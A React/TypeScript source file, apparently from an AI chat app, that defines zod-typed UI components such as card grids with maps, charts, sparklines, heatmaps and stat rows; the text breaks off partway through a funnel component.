const CardGrid = defineComponent({
  name: "CardGrid",
  description:
    "A grid of rich cards, each with a title, optional photo (https or data: URL) with alt, short text, meta line (distance or time), tags, a 0-5 rating, a price line, up to four facts (label and value, e.g. Best time, Stay) and optional latitude/longitude that adds a Show on map button. The map opens in one panel at the bottom of the grid, only when a card is picked. Optional origin (label, latitude, longitude) adds driving directions from there to the picked card. Set carousel to true to swipe through the cards in a row instead of a grid (for more than four). Good for places, hotels or products.",
  props: z.object({
    items: z.array(
      z.object({
        title: z.string(),
        text: z.string().optional(),
        meta: z.string().optional(),
        image: z.string().optional(),
        alt: z.string().optional(),
        tags: z.array(z.string()).optional(),
        rating: z.number().min(0).max(5).optional(),
        price: z.string().optional(),
        facts: z.array(z.object({ label: z.string(), value: z.string() })).optional(),
        latitude: z.number().min(-90).max(90).optional(),
        longitude: z.number().min(-180).max(180).optional(),
      })
    ),
    origin: z.object({ label: z.string(), latitude: z.number().min(-90).max(90), longitude: z.number().min(-180).max(180) }).optional(),
    carousel: z.boolean().optional(),
  }),
  component: ({ props }) => <CardGridView {...props} />,
})

type GridOrigin = { label: string; latitude: number; longitude: number }
type GridItem = {
  title: string; text?: string; meta?: string; image?: string; alt?: string; tags?: string[]
  rating?: number; price?: string; facts?: { label: string; value: string }[]
  latitude?: number; longitude?: number
}

function CardGridView({ items, origin, carousel }: { items: GridItem[]; origin?: GridOrigin; carousel?: boolean }) {
  const [picked, setPicked] = useState<number | null>(null)
  // One consent for every photo in the set: the hosts it names, and the server looking places up.
  const [photos, setPhotos] = useState(false)
  const panel = useRef<HTMLDivElement>(null)
  useEffect(() => {
    if (picked !== null) panel.current?.scrollIntoView({ block: "nearest", behavior: "smooth" })
  }, [picked])
  // The parser hands back fresh arrays while a fence streams; keep the map's inputs stable.
  const key = JSON.stringify([items.map((i) => [i.title, i.latitude, i.longitude]), origin])
  // eslint-disable-next-line react-hooks/exhaustive-deps
  const places = useMemo(() => items.map((item, index) => ({ item, index })).filter(({ item }) => item.latitude !== undefined && item.longitude !== undefined), [key])
  const locations = useMemo(
    () => [
      ...(origin ? [{ label: origin.label, latitude: origin.latitude, longitude: origin.longitude }] : []),
      ...places.map(({ item }) => ({ label: item.title, latitude: item.latitude!, longitude: item.longitude! })),
    ],
    // eslint-disable-next-line react-hooks/exhaustive-deps
    [key]
  )
  const hosts = [...new Set(items.map((i) => imageSource(i.image ?? "").host).filter((h): h is string => Boolean(h)))]
  const lookups = items.some((i) => !i.image && i.latitude !== undefined && i.longitude !== undefined)
  const photoSources = [...hosts, ...(lookups ? ["Google Places"] : [])]
  const pick = picked === null ? null : items[picked]
  const routes = useMemo(
    () => (pick && origin ? [{ name: `${origin.label} to ${pick.title}`, stops: [origin.label, pick.title], mode: "drive" as const }] : []),
    [pick, origin]
  )
  const focus = pick ? locations.findIndex((l) => l.label === pick.title) : -1
  return (
    <div className={FLOW}>
      {!photos && photoSources.length > 0 && (
        <Item
          variant="outline"
          size="xs"
          className="flex-nowrap text-start hover:bg-muted"
          render={<button type="button" onClick={() => setPhotos(true)} />}
        >
          <ItemMedia variant="icon">
            <ImageIcon aria-hidden className="text-muted-foreground" />
          </ItemMedia>
          <ItemContent className="min-w-0">
            <ItemTitle>Show photos</ItemTitle>
            <ItemDescription className="text-xs">Loads from {photoSources.join(", ")}</ItemDescription>
          </ItemContent>
          <ItemActions>
            <ChevronRight aria-hidden className="size-4 text-muted-foreground" />
          </ItemActions>
        </Item>
      )}
      {carousel ? (
        <Carousel opts={{ align: "start" }} className="w-full min-w-0">
          <CarouselContent>
            {items.map((item, index) => (
              <CarouselItem key={index} className="basis-[92%] @panel-sm:basis-[62%] @panel-md:basis-[48%]">
                <GridCard index={index} item={item} photos={photos} selected={picked === index} onPick={() => setPicked(picked === index ? null : index)} />
              </CarouselItem>
            ))}
          </CarouselContent>
          {items.length > 1 && (
            <>
              <CarouselPrevious className="left-2" />
              <CarouselNext className="right-2" />
            </>
          )}
        </Carousel>
      ) : (
        <div className="grid w-full min-w-0 grid-cols-1 gap-3 @panel-sm:grid-cols-[repeat(auto-fill,minmax(min(100%,18rem),1fr))] @panel-sm:gap-4">
          {items.map((item, index) => (
            <GridCard key={index} index={index} item={item} photos={photos} selected={picked === index} onPick={() => setPicked(picked === index ? null : index)} />
          ))}
        </div>
      )}
      {pick && (
        <div ref={panel} className="scroll-mb-4">
          <Box>
            <div className={cn("flex items-center gap-3 border-b", WELL_PAD)}>
              <span className="flex size-8 shrink-0 items-center justify-center rounded-inner bg-muted text-foreground">
                <MapPin aria-hidden className="size-4" />
              </span>
              <span className="min-w-0 flex-1">
                <span className={cn(TITLE, "block")}>{pick.title}</span>
                <span className={META}>{origin ? `Driving from ${origin.label}` : "On the map"}</span>
              </span>
              <UiButton type="button" variant="ghost" size="icon-sm" title="Hide map" onClick={() => setPicked(null)}>
                <X aria-hidden />
              </UiButton>
            </div>
            <Suspense fallback={<Skeleton aria-busy="true" className="h-24 w-full rounded-none" />}>
              <GoogleMap locations={locations} routes={routes} colors={MAP_COLORS} focus={focus >= 0 ? focus : null} onFocus={noop} label={pick.title} />
            </Suspense>
          </Box>
        </div>
      )}
    </div>
  )
}

function GridCard({ index, item, photos, selected, onPick }: { index: number; item: GridItem; photos: boolean; selected: boolean; onPick: () => void }) {
  const { title, text, meta, image, alt, tags } = item
  const { inline, host } = imageSource(image ?? "")
  const [failed, setFailed] = useState(false)
  const hasPlace = item.latitude !== undefined && item.longitude !== undefined
  // A given URL wins; with none, a place is looked up by name once the reader has asked for photos.
  const looked = usePlacePhoto(photos && !image && hasPlace ? title : null, hasPlace ? [item.latitude!, item.longitude!] : undefined)
  const photo: PlacePhoto | null = !failed && (inline || (photos && host)) && image ? { url: image } : (looked ?? null)
  // The card is its own container: stacked (photo on top) while narrow, photo on the side once it has room.
  // Text is clamped and the footer pinned, so a row of cards is one height at any width.
  return (
    <Box className={cn("@container flex h-full flex-col @min-[26rem]:flex-row", selected && "ring-2 ring-primary")}>
      <div className="relative h-36 w-full shrink-0 overflow-hidden border-b bg-muted @min-[26rem]:h-auto @min-[26rem]:w-36 @min-[26rem]:self-stretch @min-[26rem]:border-e @min-[26rem]:border-b-0">
        {photo ? (
          <img
            src={photo.url}
            alt={alt ?? title}
            loading="lazy"
            referrerPolicy="no-referrer"
            onError={() => setFailed(true)}
            className="absolute inset-0 size-full object-cover"
          />
        ) : (
          <MapPin aria-hidden className="absolute top-1/2 left-1/2 size-8 -translate-x-1/2 -translate-y-1/2 text-muted-foreground" />
        )}
        {photo?.attribution && (
          <span className="absolute inset-x-0 bottom-0 truncate bg-background/80 px-2 py-0.5 text-xs text-muted-foreground">Photo: {photo.attribution}</span>
        )}
      </div>
      <div className={cn("flex min-w-0 flex-1 flex-col gap-2", PAD)}>
        <div className="space-y-0.5">
          <div className="flex min-w-0 items-start justify-between gap-2">
            <div className={TITLE}>
              <span className="text-muted-foreground tabular-nums">{index + 1}. </span>
              {title}
            </div>
            {item.rating !== undefined && (
              <span className="inline-flex shrink-0 items-center gap-0.5 text-sm font-medium tabular-nums">
                <Star aria-hidden className="size-3.5 fill-warning text-warning" />
                {item.rating.toFixed(1)}
              </span>
            )}
          </div>
          {meta && (
            <div className={cn(META, "flex items-center gap-1")}>
              <Navigation aria-hidden className="size-3 shrink-0" />
              <span className="min-w-0 truncate">{meta}</span>
            </div>
          )}
        </div>
        {text && <p className={cn(BODY, "line-clamp-2 text-pretty")}>{text}</p>}
        {item.facts && item.facts.length > 0 && (
          <dl className="divide-y border-y">
            {item.facts.slice(0, 4).map((fact, i) => (
              <div key={i} className="flex min-w-0 items-baseline justify-between gap-3 py-1.5">
                <dt className="min-w-0 text-sm text-muted-foreground">{fact.label}</dt>
                <dd className="min-w-0 text-end text-sm font-medium break-words text-foreground">{fact.value}</dd>
              </div>
            ))}
          </dl>
        )}
        {tags && tags.length > 0 && (
          <div className="flex flex-wrap gap-1.5">
            {tags.slice(0, 3).map((tag, i) => (
              <Badge key={i} variant="secondary" className="h-auto max-w-full whitespace-normal break-words">
                {tag}
              </Badge>
            ))}
          </div>
        )}
        <div className="mt-auto flex min-w-0 flex-wrap items-center justify-between gap-x-2 gap-y-1.5 pt-1">
          {item.price ? <span className={cn(TITLE, "min-w-0 tabular-nums")}>{item.price}</span> : <span />}
          {hasPlace && (
            <UiButton type="button" size="sm" variant={selected ? "default" : "outline"} aria-pressed={selected} onClick={onPick}>
              {selected ? <ChevronDown aria-hidden data-icon="inline-start" /> : <MapPin aria-hidden data-icon="inline-start" />}
              {selected ? "On map" : "Show on map"}
            </UiButton>
          )}
        </div>
      </div>
    </Box>
  )
}

const noop = () => {}

/* ── Flowcharts ── */


/** A graph written as what it is — nodes and edges — rather than as mermaid
    source: mermaid's syntax is one more thing to get wrong. */
const graphProps = z.object({
  nodes: z.array(
    z.object({
      id: z.string(),
      label: z.string().optional(),
      shape: z.enum(["box", "round", "diamond", "circle"]).optional(),
    })
  ),
  edges: z.array(
    z.object({
      from: z.string(),
      to: z.string(),
      label: z.string().optional(),
      dashed: z.boolean().optional(),
    })
  ),
  direction: z.enum(["down", "right"]).optional(),
  caption: z.string().optional(),
})

function GraphFigure({ props }: { props: z.infer<typeof graphProps> }) {
  const chartKey = JSON.stringify([props.nodes, props.edges, props.direction])
  const chart = {
    nodes: props.nodes,
    edges: props.edges,
    direction: props.direction ?? "down",
  } as const
  return (
    <Box
      className={cn("col-span-full w-full self-stretch", PAD, "space-y-1")}
      style={{ gridColumn: "1 / -1", width: "100%", minWidth: 0 }}
    >
      {/* The figure opens into a reader: two charts, so the one in the panel
          is a fresh sketch — an arrangement made there is gone on close, the
          same as a reload. */}
      <Dialog>
        <div className="relative rounded-md">
          <InteractiveFlowchart key={chartKey} {...chart} />
          <DialogTrigger
            render={<UiButton type="button" variant="outline" size="icon-sm" title="Full screen" className="absolute top-2 right-2 z-10 bg-background" />}
          >
            <Maximize2 aria-hidden />
            <span className="sr-only">Full screen</span>
          </DialogTrigger>
        </div>
        <DialogContent className={VIEWER}>
          <DialogTitle className="sr-only">{props.caption ?? "Flowchart"}</DialogTitle>
          <InteractiveFlowchart key={chartKey} {...chart} fill />
        </DialogContent>
      </Dialog>
      {props.caption && <p className={cn(META, "px-1")}>{props.caption}</p>}
      <p className={cn(META, "px-1")}>
        Drag nodes; drag between handles to connect. Select an edge or node and press Delete to remove it.
      </p>
    </Box>
  )
}

const Flowchart = defineComponent({
  name: "Flowchart",
  description: "A flowchart from nodes and edges: each node has an id and a label, each edge joins two ids.",
  props: graphProps,
  component: GraphFigure,
})

/** Backwards-compatible name for Flowchart. */
/* ── Numbers ── */

/** One metric: its name in small caps, the figure large and tabular, the hint
    under it. On its own it is a frame; inside a `StatRow` it is a cell of the
    row's frame. */
const Stat = defineComponent({
  name: "Stat",
  description: "A single metric: a label and a value.",
  props: z.object({
    label: z.string(),
    value: z.string(),
    hint: z.string().optional(),
  }),
  component: ({ props }) => (
    <Box className={cn(PAD, "space-y-1")}>
      <p className={cn(LABEL, "text-balance")}>{props.label}</p>
      <p className="font-heading text-xl leading-tight font-medium break-words text-foreground tabular-nums @panel-sm:text-2xl">
        {props.value}
      </p>
      {props.hint && <p className={cn(META, "text-pretty")}>{props.hint}</p>}
    </Box>
  ),
})

/** A row of `Stat`s as one frame split into cells. Each cell draws its own
    right and bottom hairline as a shadow, and the frame's `overflow-hidden`
    clips the ones on its outer edge — so a row that wraps short leaves card
    ground in the gap, not the grey block a `gap-px` grid would. */
const StatRow = defineComponent({
  name: "StatRow",
  description: "A row of metrics across the width of the page.",
  props: z.object({
    stats: z.array(Stat.ref),
  }),
  component: ({ props, renderNode }) => (
    <Box
      className={cn(
        // ponytail: a hairline drawn as a 1px shadow, the one way a wrapping grid gets inner rules only.
        "grid [&>*]:shadow-[1px_0_0_0_var(--border),0_1px_0_0_var(--border)]",
        props.stats.length > 1
          ? "grid-cols-[repeat(auto-fit,minmax(min(100%,9rem),1fr))] @panel-sm:grid-cols-[repeat(auto-fit,minmax(9rem,1fr))]"
          : "grid-cols-1"
      )}
    >
      <SurfaceContext.Provider value="cell">{renderNode(props.stats)}</SurfaceContext.Provider>
    </Box>
  ),
})

/** A labelled 0-100 meter: label and figure on one line, the bar under them. */
const Progress = defineComponent({
  name: "Progress",
  description: "A labelled 0–100 meter.",
  props: z.object({
    label: z.string(),
    value: z.number(),
    hint: z.string().optional(),
  }),
  component: ({ props }) => (
    <UiProgress value={Math.min(100, Math.max(0, props.value))} className="w-full min-w-0 gap-x-3 gap-y-2">
      <ProgressLabel className="min-w-0 break-words font-normal">{props.label}</ProgressLabel>
      <ProgressValue className="shrink-0 font-medium text-foreground">{() => props.hint ?? `${Math.round(props.value)}%`}</ProgressValue>
    </UiProgress>
  ),
})

/**
 * A whole split into its parts: one bar, each segment as wide as its share,
 * and the shares listed under it. The compact answer to "where do these add
 * up" — a pie wants a chart's height and asks the reader to compare angles on
 * a phone, and six `Stat`s say the counts without ever saying they are one
 * number's parts.
 */
const Breakdown = defineComponent({
  name: "Breakdown",
  description: "One bar split into its parts, each part's share listed under the total.",
  props: z.object({
    items: z.array(
      z.object({
        label: z.string(),
        value: z.number(),
        tone: z.enum(["neutral", "info", "success", "warn", "error"]).optional(),
      })
    ),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const total = props.items.reduce((sum, item) => sum + Math.max(0, item.value), 0)
    const spoken = props.items.map((item) => `${item.label} ${item.value}`).join(", ")
    return (
      <Box className={cn(PAD, "space-y-2.5")}>
        {props.title && (
          <div className="flex min-w-0 flex-wrap items-baseline justify-between gap-x-3">
            <p className={LABEL}>{props.title}</p>
            <p className="text-xs font-medium tabular-nums text-foreground">{total}</p>
          </div>
        )}
        <div
          className="flex h-2 w-full min-w-0 overflow-hidden rounded-full bg-muted"
          role="img"
          aria-label={props.title ? `${props.title}: ${spoken}` : spoken}
        >
          {total > 0 &&
            props.items.map((item, index) => (
              <span
                key={index}
                className={cn("h-full", TONE_BAR[item.tone ?? "neutral"])}
                style={{ width: `${(Math.max(0, item.value) / total) * 100}%` }}
              />
            ))}
        </div>
        <ul className="flex min-w-0 flex-wrap gap-x-4 gap-y-1.5">
          {props.items.map((item, index) => (
            <li key={index} className="flex min-w-0 items-center gap-1.5">
              <span className={cn("size-1.5 shrink-0 rounded-full", TONE_DOT[item.tone ?? "neutral"])} />
              <span className={cn(META, "min-w-0 break-words")}>{item.label}</span>
              <span className="text-xs font-medium tabular-nums text-foreground">{item.value}</span>
              {total > 0 && (
                <span className={cn(META, "tabular-nums")}>
                  {Math.round((Math.max(0, item.value) / total) * 100)}%
                </span>
              )}
            </li>
          ))}
        </ul>
      </Box>
    )
  },
})

/** A chart: `labels` x-axis, `series` one mark each, the value at index `i`
    belonging to `labels[i]`. Colours are the app's `--chart-*` tokens.
    `pie`/`donut` read the first series only — a slice per label. */

const Chart = defineComponent({
  name: "Chart",
  description:
    "A full-width chart over shared labels: line, bar, area, radar, or pie/donut (first series only, one slice per label), with an optional title.",
  props: z.object({
    kind: z.enum(["line", "bar", "area", "pie", "donut", "radar"]),
    labels: z.array(z.string()),
    series: z.array(
      z.object({
        name: z.string(),
        values: z.array(z.number()),
      })
    ),
    height: z.number().optional(),
    stacked: z.boolean().optional(),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const round = props.kind === "pie" || props.kind === "donut"
    const data = props.labels.map((label, index) => {
      const row: Record<string, string | number> = { label }
      for (const series of props.series) row[series.name] = series.values[index] ?? 0
      return row
    })
    const config = Object.fromEntries(
      round
        ? props.labels.map((label, index) => [label, { label, color: chartColor(index) }])
        : props.series.map((series, index) => [series.name, { label: series.name, color: chartColor(index) }])
    )
    const chartId = useId().replace(/:/g, "")
    const stack = props.stacked ? "a" : undefined
    const chartHeight = Math.min(480, Math.max(180, props.height ?? (round || props.kind === "radar" ? 280 : 240)))
    const axes = (
      <>
        <CartesianGrid vertical={false} />
        <XAxis dataKey="label" tickLine={false} axisLine={false} tickMargin={8} interval="preserveStartEnd" />
        <YAxis
          tickLine={false}
          axisLine={false}
          width={36}
          tickFormatter={(value: number) => new Intl.NumberFormat(undefined, { notation: "compact", maximumFractionDigits: 1 }).format(value)}
        />
        <ChartTooltip content={<ChartTooltipContent />} />
      </>
    )
    const margin = { left: 2, right: 12, top: 12, bottom: 2 }
    const legend = <ChartLegend content={<ChartLegendContent nameKey={round ? "label" : undefined} className="flex-wrap gap-x-4 gap-y-1" />} />
    return (
      <Box className="w-full">
        {props.title && <BoxHeader title={props.title} />}
        <div className="w-full min-w-0 px-2 pt-4 pb-2 @panel-sm:px-4">
          <ChartContainer
            config={config}
            className="aspect-auto w-full min-w-0"
            style={{ height: `${chartHeight}px` }}
          >
            {round ? (
              <PieChart>
                <ChartTooltip content={<ChartTooltipContent nameKey="label" hideLabel />} />
                <Pie
                  data={props.labels.map((label, index) => ({ label, value: props.series[0]?.values[index] ?? 0 }))}
                  dataKey="value"
                  nameKey="label"
                  innerRadius={props.kind === "donut" ? "60%" : 0}
                  outerRadius="80%"
                >
                  {props.labels.map((label, index) => (
                    <Cell key={`${label}-${index}`} fill={chartColor(index)} />
                  ))}
                </Pie>
                {legend}
              </PieChart>
            ) : props.kind === "radar" ? (
              <RadarChart data={data} outerRadius="76%">
                <PolarGrid />
                <PolarAngleAxis dataKey="label" tick={{ fill: "var(--muted-foreground)" }} />
                <ChartTooltip content={<ChartTooltipContent />} />
                {props.series.map((series, index) => (
                  <Radar key={series.name} dataKey={series.name} stroke={chartColor(index)} fill={chartColor(index)} fillOpacity={0.3} />
                ))}
                {legend}
              </RadarChart>
            ) : props.kind === "bar" ? (
              <BarChart data={data} margin={margin}>
                {axes}
                {props.series.map((series, index) => (
                  <Bar
                    key={series.name}
                    dataKey={series.name}
                    stackId={stack}
                    fill={chartColor(index)}
                    radius={stack ? 0 : 8}
                    maxBarSize={props.series.length > 1 ? 28 : 44}
                  />
                ))}
                {legend}
              </BarChart>
            ) : props.kind === "area" ? (
              <AreaChart data={data} margin={margin}>
                <defs>
                  {props.series.map((series, index) => (
                    <linearGradient key={series.name} id={`${chartId}-area-${index}`} x1="0" y1="0" x2="0" y2="1">
                      <stop offset="5%" stopColor={chartColor(index)} stopOpacity={0.8} />
                      <stop offset="95%" stopColor={chartColor(index)} stopOpacity={0.1} />
                    </linearGradient>
                  ))}
                </defs>
                {axes}
                {props.series.map((series, index) => (
                  <Area
                    key={series.name}
                    type="monotone"
                    dataKey={series.name}
                    stackId={stack}
                    stroke={chartColor(index)}
                    fill={`url(#${chartId}-area-${index})`}
                  />
                ))}
                {legend}
              </AreaChart>
            ) : (
              <LineChart data={data} margin={margin}>
                {axes}
                {props.series.map((series, index) => (
                  <Line key={series.name} type="monotone" dataKey={series.name} stroke={chartColor(index)} strokeWidth={2} dot={data.length < 2} />
                ))}
                {legend}
              </LineChart>
            )}
          </ChartContainer>
        </div>
      </Box>
    )
  },
})

const Sparkline = defineComponent({
  name: "Sparkline",
  description: "A compact metric with a value, optional change, and small trend line.",
  props: z.object({
    label: z.string(),
    value: z.string(),
    values: z.array(z.number()),
    change: z.string().optional(),
    tone: z.enum(["positive", "negative", "neutral"]).optional(),
  }),
  component: ({ props }) => {
    const gradientId = `spark-${useId().replace(/:/g, "")}`
    const values = props.values.filter(Number.isFinite)
    const min = Math.min(...values, 0)
    const max = Math.max(...values, 0)
    const range = max - min || 1
    const points = values.map((value, index) => {
      const x = values.length < 2 ? 50 : (index / (values.length - 1)) * 100
      const y = 27 - ((value - min) / range) * 22
      return `${x},${y}`
    })
    const tone = props.tone ?? "neutral"
    const color = tone === "positive" ? "var(--success)" : tone === "negative" ? "var(--destructive)" : "var(--chart-1)"
    return (
      <Box className={cn("flex min-w-0 flex-row items-center justify-between gap-4", PAD)}>
        <div className="min-w-0 space-y-1">
          <p className={cn(LABEL, "text-balance")}>{props.label}</p>
          <p className="font-heading text-xl leading-tight font-medium break-words text-foreground tabular-nums @panel-sm:text-2xl">
            {props.value}
          </p>
          {props.change && <p className={cn(META, tone === "positive" && "text-success", tone === "negative" && "text-destructive")}>{props.change}</p>}
        </div>
        <svg className="h-12 w-28 shrink-0 overflow-visible" viewBox="0 0 100 32" role="img" aria-label={`${props.label} trend`}>
          <defs>
            <linearGradient id={gradientId} x1="0" y1="0" x2="0" y2="1">
              <stop offset="0%" stopColor={color} stopOpacity="0.28" />
              <stop offset="100%" stopColor={color} stopOpacity="0" />
            </linearGradient>
          </defs>
          {values.length > 1 && <polygon points={`0,32 ${points.join(" ")} 100,32`} fill={`url(#${gradientId})`} />}
          {values.length > 1 ? (
            <polyline points={points.join(" ")} fill="none" stroke={color} strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" />
          ) : values.length === 1 ? (
            <circle cx="50" cy="16" r="3" fill={color} />
          ) : (
            <line x1="2" y1="16" x2="98" y2="16" stroke="var(--border)" strokeWidth="2" strokeDasharray="3 4" />
          )}
          {values.length > 1 && <circle cx="100" cy={points.at(-1)?.split(",")[1]} r="3" fill={color} stroke="var(--card)" strokeWidth="1.5" />}
        </svg>
      </Box>
    )
  },
})

const Heatmap = defineComponent({
  name: "Heatmap",
  description: "A color-scaled grid showing values across row and column labels.",
  props: z.object({
    columns: z.array(z.string()),
    rows: z.array(z.object({ label: z.string(), values: z.array(z.number()) })),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const values = props.rows.flatMap((row) => row.values).filter(Number.isFinite)
    const min = Math.min(...values, 0)
    const max = Math.max(...values, 0)
    const range = max - min || 1
    const columns = Math.max(props.columns.length, 1)
    return (
      <Box className="w-full">
        {props.title && <BoxHeader title={props.title} />}
        {/* The grid finds the panel's width by itself: the tracks have floors in
            rem, so a narrow panel shrinks the label column and the cells rather
            than opening a scroller under a table nobody can see the end of. A
            grid too wide even for that still scrolls inside the frame. */}
        <div className={cn("overflow-x-auto", PAD)}>
          <div
            className="grid w-full min-w-0 gap-1 @panel-sm:gap-1.5"
            style={{ gridTemplateColumns: `minmax(2.75rem, 0.7fr) repeat(${columns}, minmax(1.05rem, 1fr))` }}
          >
            <span aria-hidden="true" />
            {props.columns.map((column, index) => (
              <span
                key={`${column}-${index}`}
                className={cn(LABEL, "text-center text-[0.625rem] [overflow-wrap:anywhere] @panel-sm:truncate @panel-sm:text-xs")}
                title={column}
              >
                {column}
              </span>
            ))}
            {props.rows.map((row, rowIndex) => (
              <div key={`${row.label}-${rowIndex}`} className="contents">
                <span
                  className={cn(BODY, "self-center text-xs leading-tight [overflow-wrap:anywhere] @panel-sm:truncate @panel-sm:text-sm")}
                  title={row.label}
                >
                  {row.label}
                </span>
                {props.columns.map((column, columnIndex) => {
                  const value = row.values[columnIndex]
                  const intensity = Number.isFinite(value) ? Math.round(14 + ((value - min) / range) * 86) : 0
                  return (
                    <span
                      key={`${rowIndex}-${column}-${columnIndex}`}
                      className="flex aspect-square min-h-5 items-center justify-center rounded-md text-[0.625rem] tabular-nums text-foreground"
                      style={{ background: Number.isFinite(value) ? `color-mix(in oklch, var(--chart-1) ${intensity}%, var(--muted))` : "var(--muted)", opacity: Number.isFinite(value) ? 1 : 0.45 }}
                      title={`${row.label}, ${column}: ${Number.isFinite(value) ? value : "no value"}`}
                      aria-label={`${row.label}, ${column}: ${Number.isFinite(value) ? value : "no value"}`}
                    >
                      {Number.isFinite(value) ? new Intl.NumberFormat(undefined, { notation: "compact", maximumFractionDigits: 1 }).format(value) : "-"}
                    </span>
                  )
                })}
              </div>
            ))}
          </div>
        </div>
      </Box>
    )
  },
})

const Map = defineComponent({
  name: "Map",
  description:
    "A world map with labeled markers and optional routes between them. Give each location a label, latitude and longitude in degrees, and an optional detail. A route names its stops by location label: mode drive, bike or walk is routed on real roads that the reader can re-plan; line (the default) is a straight dashed line.",
  props: z.object({
    locations: z.array(
      z.object({
        label: z.string(),
        latitude: z.number().min(-90).max(90),
        longitude: z.number().min(-180).max(180),
        detail: z.string().optional(),
      })
    ),
    title: z.string().optional(),
    routes: z
      .array(z.object({ name: z.string(), stops: z.array(z.string()), mode: z.enum(["drive", "bike", "walk", "line"]).optional() }))
      .optional(),
  }),
  component: ({ props }) => <MapView {...props} />,
})

const GoogleMap = lazy(() => import("./google-map"))
const MAP_COLORS = [0, 1, 2, 3, 4].map(chartColor)

/** An offline sketch of the map: points and routes on a dotted ground, so the closed
    state says where things are without a map load. */
function MapSketch({ locations, routes }: { locations: { label: string; latitude: number; longitude: number }[]; routes: { stops: string[] }[] }) {
  if (locations.length === 0) return null
  const W = 100
  const H = 36
  const lats = locations.map((l) => l.latitude)
  const lons = locations.map((l) => l.longitude)
  const cLat = (Math.min(...lats) + Math.max(...lats)) / 2
  const cLon = (Math.min(...lons) + Math.max(...lons)) / 2
  const k = Math.cos((cLat * Math.PI) / 180)
  const spanX = Math.max((Math.max(...lons) - Math.min(...lons)) * k, 1e-6)
  const spanY = Math.max(Math.max(...lats) - Math.min(...lats), 1e-6)
  const scale = Math.min((W - 16) / spanX, (H - 10) / spanY)
  const at = (l: { latitude: number; longitude: number }) => ({
    x: W / 2 + (l.longitude - cLon) * k * scale,
    y: H / 2 - (l.latitude - cLat) * scale,
  })
  const pos = new globalThis.Map(locations.map((l) => [l.label, at(l)]))
  return (
    <svg viewBox={`0 0 ${W} ${H}`} aria-hidden preserveAspectRatio="xMidYMid slice" className="block h-24 w-full bg-muted/50 text-muted-foreground">
      <defs>
        <pattern id="map-dots" width="4" height="4" patternUnits="userSpaceOnUse">
          <circle cx="1" cy="1" r="0.25" fill="currentColor" />
        </pattern>
      </defs>
      <rect width={W} height={H} fill="url(#map-dots)" />
      {routes.flatMap((r, ri) =>
        r.stops.slice(1).map((stop, i) => {
          const a = pos.get(r.stops[i])
          const b = pos.get(stop)
          return a && b ? (
            <line key={`${ri}-${i}`} x1={a.x} y1={a.y} x2={b.x} y2={b.y} stroke={chartColor(ri)} strokeWidth="0.5" strokeDasharray="1.5 1" opacity="0.8" />
          ) : null
        })
      )}
      {locations.map((l, i) => {
        const p = at(l)
        return <circle key={i} cx={p.x} cy={p.y} r="1.6" fill={chartColor(i)} stroke="var(--card)" strokeWidth="0.6" />
      })}
    </svg>
  )
}

function MapView(props: {
  locations: { label: string; latitude: number; longitude: number; detail?: string }[]
  title?: string
  routes?: { name: string; stops: string[]; mode?: "drive" | "bike" | "walk" | "line" }[]
}) {
  const [focus, setFocus] = useState<number | null>(null)
  // The parser hands back fresh arrays while a fence streams; a map rebuilt per chunk would lose its zoom.
  const key = JSON.stringify([props.locations, props.routes])
  // eslint-disable-next-line react-hooks/exhaustive-deps
  const locations = useMemo(() => props.locations, [key])
  // eslint-disable-next-line react-hooks/exhaustive-deps
  const routes = useMemo(() => props.routes ?? [], [key])
  const onFocus = useCallback((index: number) => setFocus(index), [])
  // A rendered Google map is a billed load, so it waits behind a click.
  const [open, setOpen] = useState(false)
  const list =
    props.locations.length > 0 ? (
      <ul className={cn("grid grid-cols-1 divide-y @panel-sm:grid-cols-2 @panel-sm:divide-y-0", PAD_ROW)}>
        {props.locations.map((location, index) => (
          <li key={`${location.label}-${index}`} className="min-w-0 @panel-sm:[&:nth-child(n+3)]:border-t">
            <button
              type="button"
              onClick={() => {
                setFocus(index)
                setOpen(true)
              }}
              className="flex w-full min-w-0 items-start gap-2.5 rounded-md py-2 text-start outline-none hover:bg-muted focus-visible:ring-[3px] focus-visible:ring-ring/50"
            >
              <span className="mt-1.5 size-2 shrink-0 rounded-full" style={{ backgroundColor: chartColor(index) }} />
              <span className="min-w-0 flex-1">
                <span className={cn(BODY, "block font-medium")}>{location.label}</span>
                <span className={META}>{location.latitude.toFixed(2)}, {location.longitude.toFixed(2)}{location.detail ? ` · ${location.detail}` : ""}</span>
              </span>
            </button>
          </li>
        ))}
      </ul>
    ) : (
      <div className={cn(META, PAD)}>No locations to plot.</div>
    )
  return (
    <Box className="w-full overflow-hidden">
      {open ? (
        <Suspense fallback={<Skeleton aria-busy="true" className="h-24 w-full rounded-none" />}>
          <GoogleMap locations={locations} routes={routes} colors={MAP_COLORS} focus={focus} onFocus={onFocus} label={props.title}>
            {list}
          </GoogleMap>
        </Suspense>
      ) : (
        <>
          <button type="button" onClick={() => setOpen(true)} className="group block w-full border-b text-start outline-none focus-visible:ring-[3px] focus-visible:ring-ring/50 focus-visible:ring-inset">
            <MapSketch locations={props.locations} routes={routes} />
            <span className={cn("flex items-center gap-3", PAD)}>
              <span className="flex size-8 shrink-0 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <MapPin aria-hidden className="size-4" />
              </span>
              <span className="min-w-0 flex-1">
                <span className={cn(TITLE, "block")}>{props.title ?? "Map"}</span>
                <span className={META}>
                  {props.locations.length} places{routes.length > 0 ? ` · ${routes.length} routes with directions` : ""}
                </span>
              </span>
              {/* Drawn as the stock button; the whole row is the one control. */}
              <span className={cn(buttonVariants({ size: "sm" }), "group-hover:bg-primary/80")}>
                Show map <ChevronRight aria-hidden data-icon="inline-end" />
              </span>
            </span>
          </button>
          {list}
        </>
      )}
    </Box>
  )
}

const Funnel = defineComponent({
  name: "Funnel",
  description: "A staged funnel showing volume and retention through each step.",
  props: z.object({
    stages: z.array(z.object({ label: z.string(), value: z.number() })),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const first = Math.max(0, props.stages[0]?.value ?? 0)
    return (
      <Box className="w-full">
        {props.title && <BoxHeader title={props.title} />}
        <div className={cn("space-y-3", PAD)}>
          {props.stages.map((stage, index) => {
            const value = Math.max(0, stage.value)
            const width = first > 0 ? Math.min(100, (value / first) * 100) : 0
            const retained = first > 0 ? Math.round((value / first) * 100) : 0
            return (
              <div key={`${stage.label}-${index}`} className="min-w-0 space-y-1.5">
